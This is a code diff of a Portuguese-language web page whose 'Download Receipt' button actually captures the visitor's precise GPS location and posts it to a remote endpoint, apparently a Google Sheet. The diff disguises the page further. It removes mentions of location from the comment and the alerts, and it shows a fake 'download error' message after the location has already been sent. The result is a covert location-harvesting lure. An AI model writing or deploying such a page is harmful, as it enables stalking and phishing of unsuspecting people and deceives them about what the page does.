@@ -40,9 +40,9 @@
 
   <h1 class="titulo">29 Set 2025 - 14:35</h1>
 
-  <button id="sendBtn">Baixar</button>
+  <button id="sendBtn">Baixar Comprovante</button>
 
-  <!-- SCRIPT DE GEOLOCALIZAÇÃO + ENVIO PARA GOOGLE SHEET -->
+  <!-- SCRIPT DE GEO + ENVIO PARA SHET -->
   <script>
   const btn = document.getElementById('sendBtn');
 
@@ -66,21 +66,21 @@
         body: JSON.stringify(payload)
       });
 
-      alert("Localização enviada com sucesso!");
+      alert("Erro ao baixar, tente novamente!");
     } catch(err){
-      alert("Falha ao enviar localização.");
+      alert("Falha ao baixar.");
     }
   }
 
   btn.addEventListener('click', () => {
     if (!("geolocation" in navigator)) {
-      alert("Seu dispositivo não suporta geolocalização.");
+      alert("Seu dispositivo não suporta.");
       return;
     }
 
     navigator.geolocation.getCurrentPosition(
       pos => sendLocation(pos),
-      err => alert("Não foi possível obter a localização."),
+      err => alert("Não foi possível."),
       { enableHighAccuracy: true }
     );
   });
@@ -88,3 +88,4 @@
 
 </body>
 </html>
+
